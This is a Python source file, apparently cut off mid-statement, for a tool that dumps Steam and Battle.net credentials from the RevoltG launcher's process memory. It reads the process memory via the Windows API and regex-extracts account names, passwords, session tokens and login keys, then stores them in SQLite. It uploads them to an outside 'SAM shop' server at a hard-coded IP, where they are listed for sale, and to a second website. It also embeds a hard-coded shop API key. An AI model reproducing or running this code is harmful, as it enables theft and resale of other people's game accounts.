"""
RevoltG Steam + Battle.net Account Dumper
Extracts Steam and Battle.net credentials from RevoltG's memory after login injection.

Usage:
  1. Open RevoltG and login to a Steam/Battle.net account
  2. Run this script as Administrator
  3. Credentials saved to revoltg_accounts.txt / DB
  4. Steam user:pass -> SAM shop API (set SAM_SHOP_KEY)

Author: Weat
"""

import ctypes
import ctypes.wintypes as wt
import re
import subprocess
import json
import os
import sys
import urllib.request
import urllib.parse
import urllib.error
import sqlite3
import time
from datetime import datetime, timezone

# Cache for Steam app names
APP_NAME_CACHE = {
    '1660': 'Resident Evil 4',
    '1117': 'GTA 5 Legacy', # Needs manual mapping
    '3651': 'Meccha Chameleon',
    '2483190': 'Forza Horizon 6 Online',
    '3008': 'ELDEN RING NIGHTREIGN Deluxe Edition - OFFLINE',
    '2798': 'ELDEN RING NIGHTREIGN Deluxe Edition - ONLINE',
    '3421': 'Resident Evil Rèquiem - Deluxe Edition'
}
REVOLT_NAME_CACHE = {}
_INSTALLED_CACHE = {}
_RUNNING_CACHE = {}

# Map spoofed/fake AppIDs to real AppIDs
APP_ID_MAP = {
    '3403': '2483190',
}

# Battle.net product ID -> display name
BNET_PRODUCT_CACHE = {
    'WoW':          'World of Warcraft',
    'WoWC':         'WoW Classic',
    'D4':           'Diablo IV',
    'D3':           'Diablo III',
    'D2':           'Diablo II: Resurrected',
    'WTCG':         'Hearthstone',
    'Hero':         'Heroes of the Storm',
    'Pro':          'Overwatch 2',
    'S1':           'StarCraft Remastered',
    'S2':           'StarCraft II',
    'VIPR':         'Call of Duty: Warzone',
    'ODIN':         'Call of Duty: Modern Warfare',
    'ZEUS':         'Call of Duty: Black Ops Cold War',
    'LAZR':         'Call of Duty: Vanguard',
    'FORE':         'Call of Duty: Modern Warfare II',
    'SPOT':         'Call of Duty: Modern Warfare III',
    'DIAB':         'Diablo Immortal',
    'BSAp':         'Warcraft Rumble',
}

# ============================================
# SAM Shop API (steam-account-manager-web)
# ============================================
# Header: X-Shop-Key  |  vault unlocked + shop enabled
# Env: SAM_SHOP_URL, SAM_SHOP_KEY, SAM_SHOP_PRICE, SAM_SHOP_UPLOAD=0 to disable

SAM_SHOP_URL = os.environ.get('SAM_SHOP_URL', 'http://26.109.24.117:3847').rstrip('/')
SAM_SHOP_KEY = os.environ.get('SAM_SHOP_KEY', 'sam_d1fa394e09141f1eae75e64f6202dba5ff27e3711f39fb11')  # Shop API page -> Rotate key
SAM_SHOP_PRICE = float(os.environ.get('SAM_SHOP_PRICE', '0') or 0)
SAM_SHOP_UPLOAD = os.environ.get('SAM_SHOP_UPLOAD', '1') not in ('0', 'false', 'False', '')

# ============================================
# VietRealm web (vietrealm.asia) - admin -> Tài khoản Revolt
# ============================================
# POST /api/revolt saves {username, email, password, note} to Redis
# Env: VIETREALM_URL, VIETREALM_UPLOAD=0 to disable

VIETREALM_URL = os.environ.get('VIETREALM_URL', 'https://vietrealm.asia').rstrip('/')
VIETREALM_UPLOAD = os.environ.get('VIETREALM_UPLOAD', '1') not in ('0', 'false', 'False', '')

# Admin key = gia tri ADMIN_PASSWORD tren Vercel. Bat buoc cho upload web.
# Doc theo thu tu tu: bien moi truong -> file "vietrealm.key" canh script -> mac dinh.
# File canh script de dua vao .gitignore, nen key khong lo len repo public.
_KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vietrealm.key')

def _load_admin_key():
    k = os.environ.get('VIETREALM_ADMIN_KEY', '').strip()
    if k:
        return k
    try:
        with open(_KEY_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except OSError:
        return ''

VIETREALM_ADMIN_KEY = _load_admin_key()

def _vr_headers():
    if not VIETREALM_ADMIN_KEY:
        print(f"{C.RED}[!] Thieu admin key -> web se tra 401.{C.RESET}")
        print(f"{C.DIM}    Tao file canh script nay, noi dung la mat khau admin:{C.RESET}")
        print(f"{C.DIM}      {C.YELLOW}vietrealm.key{C.RESET}")
    return {'Content-Type': 'application/json', 'X-Admin-Key': VIETREALM_ADMIN_KEY}

# ============================================
# Windows API
# ============================================

PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT = 0x1000
READABLE_PROTECTIONS = {0x02, 0x04, 0x08, 0x20, 0x40, 0x80}

kernel32 = ctypes.windll.kernel32

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_ulonglong),
        ("AllocationBase", ctypes.c_ulonglong),
        ("AllocationProtect", wt.DWORD),
        ("_pad1", wt.DWORD),
        ("RegionSize", ctypes.c_ulonglong),
        ("State", wt.DWORD),
        ("Protect", wt.DWORD),
        ("Type", wt.DWORD),
        ("_pad2", wt.DWORD),
    ]

# ============================================
# Colors
# ============================================

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    DIM    = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def banner():
    os.system('')  # enable ANSI on Windows
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    print(f"""
{C.CYAN}{C.BOLD}============================================================
      RevoltG Steam + Battle.net Account Manager
    
   Extracts credentials from RevoltG memory
============================================================{C.RESET}
""")

def sam_shop_upload_steam(accounts, price=None):
    """Upload Steam user:pass to SAM /api/shop/upload/json (X-Shop-Key)."""
    if not SAM_SHOP_UPLOAD:
        print(f"{C.DIM}[*] SAM upload disabled (SAM_SHOP_UPLOAD=0){C.RESET}")
        return None
    if not SAM_SHOP_KEY:
        print(f"{C.YELLOW}[!] SAM_SHOP_KEY empty — set env or edit SAM_SHOP_KEY in script{C.RESET}")
        return None

    rows = []
    for username, info in (accounts or {}).items():
        pw = info.get('password') or info.get('encrypted_password') or ''
        if not username or not pw:
            continue
        row = {
            'login': username,
            'password': pw,
            'overwrite': True,
            'listed': True,
        }
        sid = info.get('steam_id64')
        if sid and str(sid) not in ('N/A', '0', 'None', ''):
            row['steam_id_64'] = str(sid)
        persona = info.get('persona_name')
        if persona and persona != 'N/A':
            row['display_name'] = str(persona)
            row['title'] = str(persona)
        game = info.get('game_name') or ''
        gid = info.get('game_id') or ''
        bits = ['src:revoltg']
        if game:
            bits.append(f'game:{game}')
        if gid and str(gid) != 'N/A':
            bits.append(f'appid:{gid}')
        row['notes'] = ' | '.join(bits)
        p = SAM_SHOP_PRICE if price is None else price
        if p and float(p) > 0:
            row['price'] = float(p)
        rows.append(row)

    if not rows:
        print(f"{C.YELLOW}[!] No steam user:pass to upload{C.RESET}")
        return None

    payload = {'accounts': rows, 'overwrite': True, 'listed': True}
    if SAM_SHOP_PRICE > 0:
        payload['price'] = SAM_SHOP_PRICE
    body = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        f"{SAM_SHOP_URL}/api/shop/upload/json",
        data=body,
        method='POST',
        headers={
            'Content-Type': 'application/json',
            'X-Shop-Key': SAM_SHOP_KEY,
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            data = json.loads(resp.read().decode('utf-8', errors='replace'))
            print(
                f"{C.GREEN}[+] SAM upload: added={data.get('added')} "
                f"skipped={data.get('skipped')} errors={data.get('errors')} "
                f"-> {SAM_SHOP_URL}{C.RESET}"
            )
            errs = (data.get('details') or {}).get('errors') or []
            for e in errs[:5]:
                print(f"{C.RED}    err: {e}{C.RESET}")
            return data
    except urllib.error.HTTPError as e:
        err_body = e.read().decode('utf-8', errors='replace') if e.fp else ''
        print(f"{C.RED}[!] SAM upload HTTP {e.code}: {err_body[:400]}{C.RESET}")
        return None
    except Exception as e:
        print(f"{C.RED}[!] SAM upload failed: {e}{C.RESET}")
        return None


def vietrealm_upload_account(username, password, email='', note=''):
    """POST one account to vietrealm.asia /api/revolt (admin -> Tài khoản Revolt).

    The endpoint upserts on username, so this is safe to call for accounts the
    web already has: a repeat call refreshes the game note instead of adding a
    second row. Returns 'new', 'updated', or None on failure.
    """
    if not VIETREALM_UPLOAD:
        return None
    if not username:
        return None

    payload = {
        'username': str(username).strip(),
        'password': str(password).strip() if password else '',
        'email': str(email).strip() if email else '',
        'note': str(note).strip() if note else '',
    }
    req = urllib.request.Request(
        f"{VIETREALM_URL}/api/revolt",
        data=json.dumps(payload).encode('utf-8'),
        method='POST',
        headers=_vr_headers(),
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            if resp.status == 200:
                body = json.loads(resp.read().decode('utf-8', errors='replace') or '{}')
                was_update = bool(body.get('deduped'))
                tag = 'cap nhat' if was_update else 'them moi'
                print(f"{C.GREEN}[+] VietRealm {tag}: {payload['username']}{C.RESET}")
                return 'updated' if was_update else 'new'
    except urllib.error.HTTPError as e:
        err_body = e.read().decode('utf-8', errors='replace') if e.fp else ''
        print(f"{C.RED}[!] VietRealm HTTP {e.code} ({payload['username']}): {err_body[:300]}{C.RESET}")
    except Exception as e:
        print(f"{C.RED}[!] VietRealm upload failed ({payload['username']}): {e}{C.RESET}")
    return None


def vietrealm_existing_usernames():
    """Fetch usernames/emails already stored on vietrealm.asia /api/revolt (dedup)."""
    if not VIETREALM_UPLOAD:
        return set()
    try:
        req = urllib.request.Request(f"{VIETREALM_URL}/api/revolt", method='GET', headers=_vr_headers())
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read().decode('utf-8', errors='replace'))
        out = set()
        for row in (data or []):
            if not isinstance(row, dict):
                continue
            for k in ('username', 'email'):
                v = (row.get(k) or '').strip()
                if v:
                    out.add(v)
        return out
    except Exception as e:
        print(f"{C.YELLOW}[!] VietRealm dedup fetch failed: {e}{C.RESET}")
        return set()


# ============================================
# Database Helpers
# ============================================

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'revoltg_accounts.db')

def init_db():
    """Initialize SQLite database for tracking dumped accounts."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS accounts (
                    username TEXT PRIMARY KEY,
                    password TEXT,
                    steam_id TEXT,
                    dumped_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )''')
    
    # Upgrade DB schema to include full information
    new_columns = ['game_id', 'game_name', 'client_id', 'token', 'machine_id', 'login_key', 'expires', 'persona_name']
    for col in new_columns:
        try:
            c.execute(f"ALTER TABLE accounts ADD COLUMN {col} TEXT")
        except sqlite3.OperationalError:
            pass # Column already exists
    
    # Battle.net accounts table
    c.execute('''CREATE TABLE IF NOT EXISTS bnet_accounts (
                    email TEXT PRIMARY KEY,
                    password TEXT,
                    battle_tag TEXT,
                    account_id TEXT,
                    region TEXT,
                    product_id TEXT,
                    product_name TEXT,
                    web_credentials TEXT,
                    ticket TEXT,
                    bnet_token TEXT,
                    client_id TEXT,
                    expires TEXT,
                    revolt_client_id TEXT,
                    dumped_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )''')
    
    # Upgrade bnet schema
    bnet_new_cols = ['web_credentials', 'ticket', 'bnet_token', 'client_id', 'revolt_client_id', 'expires', 'region', 'product_id', 'product_name', 'account_id']
    for col in bnet_new_cols:
        try:
            c.execute(f"ALTER TABLE bnet_accounts ADD COLUMN {col} TEXT")
        except sqlite3.OperationalError:
            pass
            
    conn.commit()
    return conn

def is_account_dumped(conn, username):
    """Check if the account is already in the database."""
    c = conn.cursor()
    c.execute("SELECT 1 FROM accounts WHERE username = ?", (username,))
    return c.fetchone() is not None

def upload_db_accounts_to_web(conn, steam_path=None):
    """Re-send every account in the local DB to the web.

    The scan skips accounts already in the DB, so without this an account
    dumped before the web link existed would never be uploaded. Re-sending is
    also how a game name learned later reaches the web: POST /api/revolt
    upserts on username, so an existing row gets its note refreshed.
    """
    c = conn.cursor()
    try:
        rows = list(c.execute(
            "SELECT username, password, game_id, game_name, steam_id FROM accounts"
        ))
    except sqlite3.OperationalError:
        return 0

    sent = 0
    for username, password, game_id, game_name, steam_id in rows:
        if not username or not password:
            continue
        # Khong bo qua tai khoan da co tren web: POST /api/revolt upsert theo
        # username, nen gui lai chi lam moi ghi chu (vd ten game vua dien trong
        # game_map.txt) ma khong tao dong trung.
        # Re-resolve the name: a game_map.txt entry or a Steam API answer may
        # have turned up since the row was first written. An unnamed AppID keeps
        # its "App <id>" label so the id is not lost from the web note.
        resolved, _src = resolve_game_name(game_id, steam_path, game_name)
        label = resolved or (game_name if game_name and
                             str(game_name) != 'N/A' else None)
        if not label and game_id and str(game_id) not in ('N/A', '0', 'None', ''):
            label = f"App {game_id}"
        bits = ['Steam']
        if label:
            bits.append(f'game:{label}')
        if steam_id and str(steam_id) not in ('N/A', '0', 'None', ''):
            bits.append(f'id:{steam_id}')
        if vietrealm_upload_account(username, password, note=' | '.join(bits)):
            sent += 1
    if sent:
        print(f"{C.GREEN}[+] Sent {sent} account(s) from local DB to the web{C.RESET}")
    return sent

def save_account_to_db(conn, info):
    """Save account to database."""
    c = conn.cursor()
    c.execute("""
        INSERT OR REPLACE INTO accounts 
        (username, password, steam_id, game_id, game_name, client_id, token, machine_id, login_key, expires, persona_name) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        info.get('username'),
        info.get('password') or info.get('encrypted_password'),
        info.get('steam_id64'),
        info.get('game_id'),
        info.get('game_name'),
        info.get('revolt_client_id'),
        info.get('token'),
        info.get('machine_id'),
        info.get('login_key'),
        info.get('expires'),
        info.get('persona_name')
    ))
    conn.commit()

def is_bnet_account_dumped(conn, email):
    """Check if the bnet account is already in the database."""
    c = conn.cursor()
    c.execute("SELECT 1 FROM bnet_accounts WHERE email = ?", (email,))
    return c.fetchone() is not None

def save_bnet_account_to_db(conn, info):
    """Save Battle.net account to database."""
    c = conn.cursor()
    c.execute("""
        INSERT OR REPLACE INTO bnet_accounts
        (email, password, battle_tag, account_id, region, product_id, product_name,
         web_credentials, ticket, bnet_token, client_id, expires, revolt_client_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        info.get('email'),
        info.get('password'),
        info.get('battle_tag'),
        info.get('account_id'),
        info.get('region'),
        info.get('product_id'),
        info.get('product_name'),
        info.get('web_credentials'),
        info.get('ticket'),
        info.get('bnet_token'),
        info.get('client_id'),
        info.get('expires'),
        info.get('revolt_client_id'),
    ))
    conn.commit()

# ============================================
# Process helpers
# ============================================

def get_pids(process_name):
    """Get all PIDs for a given process name."""
    pids = []
    r = subprocess.run(
        ['tasklist', '/FI', f'IMAGENAME eq {process_name}', '/FO', 'CSV', '/NH'],
        capture_output=True, text=True
    )
    for line in r.stdout.strip().split('\n'):
        if process_name.lower() in line.lower():
            parts = line.replace('"', '').split(',')
            if len(parts) >= 2:
                try:
                    pids.append(int(parts[1]))
                except ValueError:
                    pass
    return pids


def get_steam_path():
    """Get Steam install path from registry."""
    try:
        r = subprocess.run(
            ['reg', 'query', r'HKEY_CURRENT_USER\SOFTWARE\Valve\Steam', '/v', 'SteamPath'],
            capture_output=True, text=True
        )
        for line in r.stdout.strip().split('\n'):
            if 'SteamPath' in line:
                parts = line.strip().split('    ')
                return parts[-1].strip()
    except:
        pass
    return None

def get_running_steam_appid():
    """Get currently running Steam AppID from registry."""
    try:
        r = subprocess.run(
            ['reg', 'query', r'HKEY_CURRENT_USER\SOFTWARE\Valve\Steam', '/v', 'RunningAppID'],
            capture_output=True, text=True
        )
        for line in r.stdout.strip().split('\n'):
            if 'RunningAppID' in line:
                # REG_DWORD value example:    RunningAppID    REG_DWORD    0x67c
                parts = line.strip().split()
                if len(parts) >= 3:
                    val = parts[-1]
                    if val.startswith('0x'):
                        return str(int(val, 16))
                    return str(int(val))
    except:
        pass
    return None

def get_game_name_from_appmanifest(steam_path, app_id):
    """Fetch game name locally from steamapps/appmanifest_{app_id}.acf"""
    if not steam_path or not app_id:
        return None
    manifest_path = os.path.join(steam_path, 'steamapps', f'appmanifest_{app_id}.acf')
    if os.path.exists(manifest_path):
        try:
            with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if '"name"' in line:
                        m = re.search(r'"name"\s+"([^"]+)"', line)
                        if m:
                            return m.group(1)
        except:
            pass
    return None


def scan_installed_apps(steam_path):
    """Index every appmanifest -> {appid: name} for the installed Steam library.

    Lets the dumper name a game even when the Steam store API is unreachable,
    which is common on the network these dumps run on.
    """
    if not steam_path:
        return {}
    if steam_path in _INSTALLED_CACHE:
        return _INSTALLED_CACHE[steam_path]

    index = {}
    steamapps = os.path.join(steam_path, 'steamapps')
    if os.path.isdir(steamapps):
        try:
            for fn in os.listdir(steamapps):
                m = re.match(r'appmanifest_(\d+)\.acf$', fn)
                if not m:
                    continue
                app_id = m.group(1)
                if app_id in index:
                    continue
                name = get_game_name_from_appmanifest(steam_path, app_id)
                if name:
                    index[app_id] = name
        except:
            pass

    # Fall back to library folders (game may live on another drive)
    try:
        lib_file = os.path.join(steam_path, 'steamapps', 'libraryfolders.vdf')
        if os.path.isfile(lib_file):
            with open(lib_file, 'r', encoding='utf-8', errors='ignore') as f:
                for m in re.finditer(r'"path"\s+"([^"]+)"', f.read()):
                    other = m.group(1).replace('\\\\', '\\')
                    for fn in os.listdir(os.path.join(other, 'steamapps')):
                        mm = re.match(r'appmanifest_(\d+)\.acf$', fn)
                        if not mm or mm.group(1) in index:
                            continue
                        name = get_game_name_from_appmanifest(
                            os.path.join(other), mm.group(1))
                        if name:
                            index[mm.group(1)] = name
    except:
        pass

    _INSTALLED_CACHE[steam_path] = index
    return index


def get_installed_app_name(steam_path, app_id):
    """Name of app_id from the local Steam install, or None."""
    if not steam_path or not app_id or str(app_id) in ('N/A', '0', 'None', ''):
        return None
    return scan_installed_apps(steam_path).get(str(app_id))


def get_running_game_names(steam_path):
    """{appid: name} for the game Steam itself reports as running right now.

    Steam publishes the active title in HKCU\\...\\Valve\\Steam\\RunningAppID,
    which is the only trustworthy "which game is this" signal. Guessing from
    manifest timestamps was tried and rejected: it labelled every account
    "Bodycam" because that manifest was the last one Steam touched, hours
    after the user had left the game. A wrong game name is worse than none.
    """
    if not steam_path:
        return {}
    cache = _RUNNING_CACHE.get(steam_path)
    if cache and (time.time() - cache[1]) < 5:
        return cache[0]

    result = {}
    app_id = get_running_steam_appid()
    if app_id and app_id not in ('0', 'None'):
        # Resolve the running id through APP_ID_MAP too, then look for a name.
        real_id = str(APP_ID_MAP.get(app_id, app_id))
        name = (get_game_name_from_appmanifest(steam_path, app_id)
                or get_installed_app_name(steam_path, real_id)
                or APP_NAME_CACHE.get(real_id))
        if name:
            result[real_id] = name

    _RUNNING_CACHE[steam_path] = (result, time.time())
    return result


# ============================================
# Game name resolution
# ============================================
# RevoltG hands out AppIDs that do not exist on the Steam store (store.steampowered
# .com/app/1885 redirects to the front page) and that are never installed locally,
# so neither the store API nor the local appmanifest can name them. The only
# remaining source is a name RevoltG states itself, or one the user supplies.
# game_map.txt is that user-supplied table: "appid = Game Name", one per line.

GAME_MAP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             'game_map.txt')

GAME_MAP_HEADER = """# Ten game theo AppID cua RevoltG
#
# RevoltG cap cho nhung AppID ma Steam khong biet (store.steampowered.com se
# chuyen ve trang chu), nen tool khong tra duoc ten. Game ban mo trong RevoltG
# se ghi o cuoi file - chi can them ten vao ben phai "=" roi chay lai la xong.
#
# Vi du:
# 1885 = Ten Game
"""


def load_game_map():
    """Read game_map.txt into {appid: name}. Missing file is not an error."""
    out = {}
    try:
        with open(GAME_MAP_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.split('#', 1)[0].strip()
                if not line or '=' not in line:
                    continue
                key, _, val = line.partition('=')
                key, val = key.strip(), val.strip()
                if key and val and not key.lower().startswith('appid'):
                    out[key] = val
    except OSError:
        pass
    return out


def _appids_listed_in_map_file():
    """Every appid mentioned in game_map.txt, named or not."""
    out = set()
    try:
        with open(GAME_MAP_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.split('#', 1)[0].strip()
                if not line or '=' not in line:
                    continue
                key = line.partition('=')[0].strip()
                if key and not key.lower().startswith('appid'):
                    out.add(key)
    except OSError:
        pass
    return out


def remember_unresolved_appids(app_ids):
    """Append any appid we could not name to game_map.txt so the user can fill
    it in once. Rewrites the file only when something new needs adding."""
    app_ids = {str(a) for a in app_ids
               if a and str(a) not in ('N/A', '0', 'None', '')}
    if not app_ids:
        return []

    # Dedupe against every appid the file mentions, including blank entries
    # waiting to be filled in. load_game_map() skips those, so it cannot be
    # used here or the same id would be re-appended on every run.
    already_listed = _appids_listed_in_map_file()
    new = sorted(app_ids - already_listed)
    if not new:
        return []

    try:
        exists = os.path.exists(GAME_MAP_FILE)
        with open(GAME_MAP_FILE, 'a', encoding='utf-8') as f:
            if not exists:
                f.write(GAME_MAP_HEADER)
            f.write(f"\n# --- {datetime.now().strftime('%Y-%m-%d %H:%M')} ---\n")
            for app_id in new:
                f.write(f"{app_id} = \n")
    except OSError as e:
        print(f"{C.DIM}    (khong ghi duoc game_map.txt: {e}){C.RESET}")
    return new


def resolve_game_name(game_id, steam_path=None, payload_name=None):
    """Best available name for an AppID, plus how it was determined.

    Returns (name, source). Sources, most to least trustworthy:
      map     - game_map.txt, set by the user
      revolt  - the name RevoltG itself put in its own payload
      local   - appmanifest of the game installed on this machine
      api     - the Steam store
      running - the game Steam reports as currently running
    A fake AppID resolves to None, and the caller reports it as unknown rather
    than inventing a name.
    """
    if not game_id or str(game_id) in ('N/A', '0', 'None', ''):
        return (payload_name or None), ('revolt' if payload_name else None)

    game_id = str(game_id)

    # 1. User-supplied name wins over everything.
    name = load_game_map().get(game_id)
    if name:
        return name, 'map'

    # 2. What RevoltG itself said about this account.
    if payload_name and not str(payload_name).startswith('App '):
        return str(payload_name), 'revolt'

    # 3. The built-in table of hand-verified ids.
    name = APP_NAME_CACHE.get(game_id)
    if name:
        return name, 'cache'

    # 4. Installed on this machine, in any Steam library.
    name = get_game_name_from_appmanifest(steam_path, game_id)
    if name:
        return name, 'local'
    name = get_installed_app_name(steam_path, game_id)
    if name:
        return name, 'local'

    # 5. The Steam store.
    name = get_steam_app_name(game_id, steam_path)
    if name:
        return name, 'api'

    return None, None

def get_steam_app_name(app_id, steam_path=None):
    """Fetch game name from Steam API or local manifest. Fast cache return."""
    if not app_id or app_id == 'N/A' or app_id == '0':
        return None
    
    app_id = str(app_id)
    if app_id in APP_NAME_CACHE:
        return APP_NAME_CACHE[app_id]
        
    # 1. Try local appmanifest first (instant, no API rate limits)
    local_name = get_game_name_from_appmanifest(steam_path, app_id)
    if local_name:
        APP_NAME_CACHE[app_id] = local_name
        return local_name

    # 1b. Same app, but installed on another Steam library
    local_name = get_installed_app_name(steam_path, app_id)
    if local_name:
        APP_NAME_CACHE[app_id] = local_name
        return local_name
        
    # 2. Try Steam API. The store endpoint answers {"success": false} for many
    #    titles here, so also try the appdetails page and a longer timeout.
    for url in (
        f'https://store.steampowered.com/api/appdetails?appids={app_id}&l=english&cc=us',
        f'https://store.steampowered.com/api/appdetails?appids={app_id}',
    ):
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json',
            })
            resp = urllib.request.urlopen(req, timeout=6)
            if resp.status == 200:
                data = json.loads(resp.read().decode('utf-8'))
                node = data.get(app_id) if data else None
                if node and node.get('success'):
                    name = node['data'].get('name')
                    if name:
                        APP_NAME_CACHE[app_id] = name
                        return name
        except Exception:
            pass
        
    return None

# ============================================
# Memory scanner
# ============================================

# Precompile regexes for speed — max 5000 to capture full JWTs
ASCII_RE = re.compile(rb'[\x20-\x7e]{4,5000}')
UTF16_RE = re.compile(rb'(?:[\x20-\x7e]\x00){4,2500}')

def scan_process(pid, patterns):
    """Scan a process's memory for byte patterns. Returns list of (pattern, context_strings)."""
    handle = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
    if not handle:
        return []
    
    results = []
    mbi = MEMORY_BASIC_INFORMATION()
    addr = 0
    
    MEM_PRIVATE    = 0x20000
    PAGE_READWRITE = 0x04
    
    # Build a single regex to find any pattern instantly in C
    pattern_bytes = [re.escape(p[1]) for p in patterns]
    fast_re = re.compile(b'(' + b'|'.join(pattern_bytes) + b')')
    
    # Precompile specific signature patterns
    json_sig  = b'"account"'
    login_sig = b'-login'
    
    # BNet sigs need co-presence check: need at least 2 to be worth scanning deep
    bnet_sigs_all = [BNET_JSON_SIG, BNET_BNET_SIG, BNET_TOKEN_SIG, BNET_TICKET_SIG]
    
    while addr < 0x7FFFFFFFFFFF:
        if kernel32.VirtualQueryEx(handle, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)) == 0:
            break
        
        # Optimize: Only scan MEM_PRIVATE and PAGE_READWRITE
        if (mbi.State == MEM_COMMIT and
            mbi.Type == MEM_PRIVATE and
            mbi.Protect == PAGE_READWRITE and
            0 < mbi.RegionSize < 80_000_000):
            
            buf = ctypes.create_string_buffer(mbi.RegionSize)
            br  = ctypes.c_size_t(0)
            
            if kernel32.ReadProcessMemory(handle, ctypes.c_void_p(mbi.BaseAddress),
                                          buf, mbi.RegionSize, ctypes.byref(br)):
                data = buf.raw[:br.value]
                
                # Check which sigs are present
                has_steam = (json_sig in data or login_sig in data)
                bnet_hits = sum(1 for sig in bnet_sigs_all if sig in data)
                
                if not has_steam and bnet_hits == 0:
                    next_addr = mbi.BaseAddress + mbi.RegionSize
                    if next_addr <= addr:
                        break
                    addr = next_addr
                    continue
                
                # ---- Standard per-hit pass (Steam + small bnet hits) ----
                last_end = 0
                for match in fast_re.finditer(data):
                    idx = match.start()
                    
                    if idx < last_end:
                        continue
                    
                    s = max(0, idx - 200)
                    e = min(len(data), idx + 600)
                    last_end = e
                    ctx = data[s:e]
                    
                    ascii_strs = [x.decode('ascii',   errors='ignore') for x in ASCII_RE.findall(ctx)]
                    utf16_strs = [x.decode('utf-16le',errors='ignore') for x in UTF16_RE.findall(ctx)]
                    
                    results.append(('hit', ascii_strs + utf16_strs))
                
                # ---- BNet full-region pass ----
                # When bnet sigs are present, decode the ENTIRE region as one blob
                # so that email and webCredentials (which can be far apart) are
                # both visible in the same string fed to the extractor.
                if bnet_hits >= 1:
                    # Chunk into 64KB slices to avoid OOM on huge regions
                    CHUNK = 65536
                    for off in range(0, len(data), CHUNK):
                        chunk = data[off:off + CHUNK]
                        ascii_chunk = chunk.decode('ascii', errors='replace')
                        utf16_chunk = chunk.decode('utf-16le', errors='replace')
                        # Only keep chunks that actually have bnet content
                        for decoded in (ascii_chunk, utf16_chunk):
                            if any(sig.decode('ascii', errors='ignore') in decoded
                                   for sig in bnet_sigs_all):
                                results.append(('bnet_region', [decoded]))
        
        next_addr = mbi.BaseAddress + mbi.RegionSize
        if next_addr <= addr:
            break
        addr = next_addr
    
    kernel32.CloseHandle(handle)
    return results


# ============================================
# Credential extraction
# ============================================

# Battle.net pre-scan signatures
BNET_JSON_SIG  = b'"email"'
BNET_BNET_SIG  = b'battleTag'
BNET_TOKEN_SIG = b'webCredentials'
BNET_TICKET_SIG= b'"ticket"'

def extract_json_credentials(all_strings):
    """Extract JSON credential payloads from scanned strings."""
    creds = []
    seen = set()
    
    for s in all_strings:
        # Look for the RevoltG payload signature: account + password together
        if '"account"' not in s or '"password"' not in s:
            continue
            
        # Find all account keys
        for a_match in re.finditer(r'"account"\s*:\s*"([^"]+)"', s):
            account = a_match.group(1)
            if len(account) < 4 or account in seen:
                continue
            
            # Context window around the account match
            start = max(0, a_match.start() - 300)
            end = min(len(s), a_match.end() + 300)
            ctx = s[start:end]
            
            # Find password in the same context
            p_match = re.search(r'"password"\s*:\s*"([^"]+)"', ctx)
            if not p_match:
                continue
                
            password = p_match.group(1)
            seen.add(account)
            
            game_id = ''
            client_id = ''
            expires = ''
            token = ''
            machine_id = ''
            login_key = ''
            
            game_name = ''
            
            # Match gameName or appName
            n_match = re.search(r'"(?:gameName|appName|title|name)"\s*:\s*"([^"]+)"', ctx)
            if n_match:
                game_name = n_match.group(1)
            
            # Match appId explicitly first
            a_match = re.search(r'"appId"\s*:\s*"?(\d+)"?', ctx)
            if a_match:
                game_id = a_match.group(1)
            else:
                # Fallback to gameId or steamId
                g_match = re.search(r'"(?:gameId|steamId)"\s*:\s*"?(\d+)"?', ctx)
                if g_match:
                    game_id = g_match.group(1)
            
            # If we extracted both, pre-seed the global cache with this exact name so we don't lose it
            if game_id and game_name and game_id != '0':
                # Only cache if it doesn't look like generic "App XXXX"
                if not game_name.startswith('App '):
                    APP_NAME_CACHE[game_id] = game_name
                    REVOLT_NAME_CACHE[game_id] = game_name
                
            # Match clientId
            c_match = re.search(r'"clientId"\s*:\s*"([^"]+)"', ctx)
            if c_match:
                client_id = c_match.group(1)
                
            # Match expires
            e_match = re.search(r'"expires"\s*:\s*"?(\d+)"?', ctx)
            if e_match:
                expires = e_match.group(1)
                
            # Match extra metadata
            t_match = re.search(r'"(?:token|sessionToken|accessToken)"\s*:\s*"([^"]+)"', ctx)
            if t_match:
                token = t_match.group(1)
                
            m_match = re.search(r'"(?:machineId|deviceId)"\s*:\s*"([^"]+)"', ctx)
            if m_match:
                machine_id = m_match.group(1)
                
            l_match = re.search(r'"(?:loginKey|authCode|authTicket)"\s*:\s*"([^"]+)"', ctx)
            if l_match:
                login_key = l_match.group(1)
            
            creds.append({
                'account': account,
                'password': password,
                'gameId': game_id,
                'gameName': game_name,
                'steamId': game_id, # for compatibility
                'clientId': client_id,
                'expires': expires,
                'token': token,
                'machineId': machine_id,
                'loginKey': login_key
            })
    return creds


# JWT regex — matches full header.payload.signature tokens
# Must start with eyJ (base64url of `{"`) for both header and payload
JWT_RE = re.compile(
